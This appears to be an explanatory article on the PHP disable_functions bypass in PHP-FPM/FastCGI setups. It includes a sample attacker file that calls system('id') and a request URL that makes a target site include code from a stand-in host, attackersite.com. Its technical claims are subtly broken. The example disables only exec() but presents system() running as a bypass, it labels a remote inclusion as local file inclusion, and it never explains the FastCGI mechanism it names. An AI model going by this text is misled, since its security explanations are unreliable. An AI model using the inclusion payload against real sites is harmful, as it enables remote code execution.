# disable_functions bypass - php-fpm/FastCGI


# üëâ¬†Overview

---

### üëÄ¬†What ?

PHP's disable_functions is a configuration directive that allows server administrators to disable certain PHP functions that they consider to be potentially harmful. The disable_functions bypass technique is used in the context of exploiting PHP-FPM/FastCGI setups. PHP-FPM (FastCGI Process Manager) is an alternative PHP FastCGI implementation that is particularly suited for websites requiring high performance.


### üßê¬†Why ?

Understanding disable_functions bypass in PHP-FPM/FastCGI is crucial for cybersecurity professionals, server administrators, and web developers. It is important because it helps identify potential security risks and vulnerabilities in server configurations. Misconfigurations could allow malicious users to bypass disable_functions directive which could lead to severe security issues including remote code execution (RCE) and unauthorized access to system resources.


### ‚õèÔ∏è¬†How ?

To use the disable_functions bypass, an attacker usually needs to have a certain level of access to the server. This could be through an existing vulnerability in an application running on the server. The attacker then attempts to manipulate PHP-FPM/FastCGI configurations to ignore the disable_functions directive. Because of the potential risks, server administrators should regularly check and properly configure disable_functions directive and be aware of potential bypass techniques.


### ‚è≥¬†When ?

The use and exploitation of disable_functions bypass in PHP-FPM/FastCGI has been known since PHP introduced the disable_functions directive in PHP 4.0.3, which was released in 2000. It has been a topic of interest in the cybersecurity community due to the potential security implications if not properly handled.


# ‚öôÔ∏è¬†Technical Explanations

---

The `disable_functions` directive in PHP allows server administrators to disable specific PHP functions that could potentially be exploited by attackers. This could include functions like `exec()`, `shell_exec()`, and `system()` which, when misused, might lead to severe security risks such as remote code execution or unauthorized access to system resources.

However, in certain setups of PHP-FPM (FastCGI Process Manager) and FastCGI, it's possible for attackers to bypass this directive due to misconfigurations. PHP-FPM is an alternative PHP FastCGI implementation that is known for its high performance. It is often used in high-traffic websites and applications.

The bypassing of the `disable_functions` directive typically happens when PHP-FPM is not correctly isolated and secured. For instance, an attacker could exploit a local file inclusion (LFI) vulnerability to execute arbitrary code, thus bypassing the `disable_functions` directive. An LFI vulnerability occurs when an application allows user-supplied input in file or directory paths. This could lead to unauthorized file access or even code execution.

It is therefore crucial for server administrators to properly configure and secure their PHP-FPM and FastCGI setups. This involves ensuring that PHP-FPM is correctly isolated and that the `disable_functions` directive is properly configured. Regular checks should be performed to prevent potential bypass techniques.

The `disable_functions` bypass technique in PHP-FPM/FastCGI has been known since PHP 4.0.3, which was introduced in 2000. This issue remains relevant due to the potential security implications if not properly managed. As such, understanding this bypass technique is vital for cybersecurity professionals, server administrators, and web developers. It helps in identifying potential security risks and vulnerabilities in server configurations, leading to a safer and more secure web environment.

For example, let's consider a PHP application running on a server with PHP-FPM and FastCGI. The server has disabled the function `exec()` using the `disable_functions` directive.

```php
; php.ini
disable_functions = exec

```

However, due to a Local File Inclusion (LFI) vulnerability, an attacker can run arbitrary code. They could do this by tricking the application into including a file from an external source, which contains malicious PHP code.

```php
// Attacker's external file - evil.php
<?php
  system('id');
?

```

The attacker could then make a request to a vulnerable endpoint in the application.

```bash
<http://targetsite.com/vuln_page.php?file=http://attackersite.com/evil.php

```

The application includes the malicious file, and the `system('id')` command is executed, bypassing the `disable_functions` directive.

Here, the crucial step was that the attacker was able to exploit an LFI vulnerability in the application. To prevent this, the application should validate user-supplied input for file includes, and the server should be configured to disallow including files from external sources.

Moreover, the PHP-FPM should be correctly isolated and secured. For example, using containers or chroot environments to isolate the PHP-FPM processes can prevent an attacker from escalating their privileges even if they manage to execute arbitrary code.

```bash
; www.conf
[www]
chroot = /home/www/

```

These examples demonstrate the importance of proper server configuration, application security, and awareness of potential bypass techniques.
